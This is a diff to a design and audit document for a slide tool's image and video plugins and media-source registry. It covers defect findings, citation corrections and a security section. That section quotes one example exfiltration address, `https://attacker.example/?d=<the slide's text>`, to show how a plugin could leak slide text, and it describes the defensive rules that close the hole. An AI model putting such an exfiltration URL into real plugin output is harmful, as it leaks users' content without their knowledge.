@@ -4,7 +4,8 @@ summary: >
   Images and videos become two plugins, `image` and `video`, that any slide can use through Segno records
   (`@image{…}`, `@video{…}`), with Markdown's `![alt](src)` kept as the image's alias. Where the bytes come
   from is a separate, core concern: one registry of media sources (data, relative, file, web, sample, asset,
-  later Google Drive) replaces the scheme checks repeated across five files. Video hosts stay one table of
+  later Google Drive) replaces the scheme checks repeated at nine
+  sites across three core files. Video hosts stay one table of
   provider rows, extended with a `file` row for MP4 and WebM. The audit found nine defects in today's wiring,
   one of them confirmed by a render: a relative image in slide text breaks in a CLI export written to another folder.
   Owner decisions: a clean break from Marp's alt-text keywords with an autofix, `>` as the video sigil, and remote
@@ -73,7 +74,7 @@ section background. `collage` reads `- ![Alt](path) \`hero, top, 3:2\`` list ite
 | Source | Written | Resolved by | Preview | Export |
 |---|---|---|---|---|
 | Embedded | `data:image/png;base64,…` | passes through | renders | renders |
-| Relative path | `pic.jpg` | `resolveAssetUrl` (`bg-image.js:86`) against `baseUrl` | against the host's base | CLI lifts `![bg]` to `file://`; the player inlines `file://` as `data:` (`html-player.js:70-112`) |
+| Relative path | `pic.jpg` | `resolveAssetUrl` (`bg-image.js:73`) against `baseUrl` | against the host's base | CLI lifts `![bg]` to `file://`; the player inlines `file://` as `data:` (`html-player.js:70-112`) |
 | Absolute / `file:` | `/x/pic.jpg` | passes through | as written | inlined by `inlineFileUrls` |
 | Web | `https://…` | `blockWebImages` (`remote-ref.js:527`) | a drawn hatch until the reader allows it | CLI: blocked unless `--allow-remote`; Studio player: fetched on opt-in, capped (`inline-url-media.mjs:132`) |
 | Sample art | `sample:<name>` | `sampleName` (`remote-ref.js:67`) + `samplesUrl` | the site's staged copy | `file://` into `lib/samples/` |
@@ -93,8 +94,8 @@ one-row change" (lines 324-327).
 
 | # | Defect | Evidence |
 |---|---|---|
-| D1 | **A relative image in slide text breaks in a CLI export written to another folder.** Chromium loads the page from the output path, and the CLI passes the engine `samplesUrl` but no `baseUrl` (`lattice.js:2178,2191`), so `![a](pic.jpg)` resolves against the output folder. `![bg]` is unaffected because the CLI lifts it to `file://` first | **Confirmed by render, 2026-10-16:** `deck/d.md` → `out/d.png` shows a broken-image icon and the PDF writer reports "1 not-loaded"; the same deck rendered into `deck/` shows the picture. Logged as `followups.d/2727-p1-cli-relative-prose-image.md` |
-| D2 | The `sample:` / `asset:` checks are repeated in five places, so a new source means editing all of them, and the security predicate (`isRemoteUrl`) can drift from the resolver | §2 |
+| D1 | **A relative image in slide text breaks in a CLI export written to another folder.** Chromium loads the page from the output path, and the CLI passes the engine `samplesUrl` but no `baseUrl` (`lattice.js:2178,2191`), so `![a](pic.jpg)` resolves against the output folder. `![bg]` is unaffected because the CLI lifts it to `file://` first | **Confirmed by render, 2026-10-16:** `deck/d.md` → `-o out/d.png` writes `out/d.001.png`, which shows a broken-image icon and the PDF writer reports "1 not-loaded"; the same deck rendered into `deck/` shows the picture. Logged as `followups.d/2727-p1-cli-relative-prose-image.md` |
+| D2 | The `sample:` / `asset:` checks are repeated at nine sites across three core files (`bg-image.js`, `background-image.js`, `remote-ref.js`), plus more in the Studio's `asset:` helpers, so a new source means editing all of them, and the security predicate (`isRemoteUrl`) can drift from the resolver | §2 |
 | D3 | The CLI lifts `![bg]` on every slide (`liftBgImages`, `lattice.js:2170`); the engine lifts only on `image` slides (`bg-image.js:172`). Two render paths, two behaviors (HARD RULE #1) | code reading |
 | D4 | `bgDiv` drops `fit` / `contain`; only the engine's section-background rule honors them | `bg-image.js:151` vs `background-image.js:39` |
 | D5 | Marp's `w:`, `h:`, filters (`blur`, `sepia`, …) and `bg left:40%` are not implemented. `![w:200](x)` renders a full-size image with "w:200" as its alt text; `bg left:40%` renders a full-bleed cover | no handler in `lib/`; `BG_RE` rejects `:` and `%` (checked with `node -e`) |
@@ -187,12 +188,13 @@ hosts can serve it, and the others show the stand-in.
 
 ### 4.5 The address comes only from the author's block (added 2026-10-16, after #2725)
 
-**The attack.** PR #2725 (`claude/plugin-inline-door-followups`) found that the built-in `video`, `qr`
-variant, `contact` and `wifi` passes read a slide's text and turn any address they find into something the
+**The attack.** A red team recorded it on 2026-10-12 (`lib/transformers/rebuilt-classes.js:4-11`), and
+PR #2725 (`claude/plugin-inline-door-followups`) is closing it out: the built-in `video`, `qr` variant,
+`contact` and `wifi` passes read a slide's text and turn any address they find into something the
 viewer loads or scans (a poster link, a QR code). A zip plugin's output also lands on the slide as text. So a
 plugin with no network of its own can write `https://attacker.example/?d=<the slide's text>` onto a video
 slide, and Lattice's own pass publishes it. Today `lib/transformers/rebuilt-classes.js` stops this by
-refusing to let any plugin draw on those slides. The owner wants plugins to draw everywhere, which is safe
+refusing to let a data plugin's fence draw on those slides (its consumer is `lib/packages/code-door.js`). The owner wants plugins to draw everywhere, which is safe
 only if no code turns slide text into an address. These plugins are where that becomes true, so they follow
 #2725's five rules:
 
@@ -209,7 +211,8 @@ only if no code turns slide text into an address. These plugins are where that b
    tokens in the engine, before any plugin draws. `lint:deck --fix` offers the `@video{…}` record in its
    place, the same migration as the Marp keywords (§8, decision 2).
 5. **The old pass is deleted in the commit that replaces it**: its registry entry, its DOM half, and its row
-   on #2725's `SANCTIONED_SLIDE_TEXT_ADDRESS_READERS`. The shadow list in `rebuilt-classes.js` is derived from
+   on #2725's `SANCTIONED_SLIDE_TEXT_ADDRESS_READERS` (that check and its allowlist are pending in #2725 and
+   were not yet on its branch at `98a69d6`; if they land renamed, follow the landed names). The shadow list in `rebuilt-classes.js` is derived from
    the registry, so it shrinks on its own. These plugins never go on that allowlist: if
    `checkSlideTextAddressReaders` flags them, the code is wrong.
 
@@ -315,6 +318,8 @@ Slices 2 and 3 rebase onto #2725 once it lands, because they delete rows from it
 
 - 2026-10-16: audit and proposal written; D1 confirmed by render and logged. Owner settled decisions 2-4;
   decision 1 (packaging) is on hold.
+- 2026-10-16: a fact-check pass corrected five citations: the scheme-check count, a line number, the scope of
+  `rebuilt-classes.js`, and the status of #2725's check, which is not pushed yet.
 - 2026-10-16: §4.6 added: each plugin's guide, fixtures, drawn icon and docs-site entry.
 - 2026-10-16: §4.5 added after #2725's attack. The design now takes every address from the author's block.
   The inline records stay off the runtime DOM mirror, and every slice gets the adversarial trio.
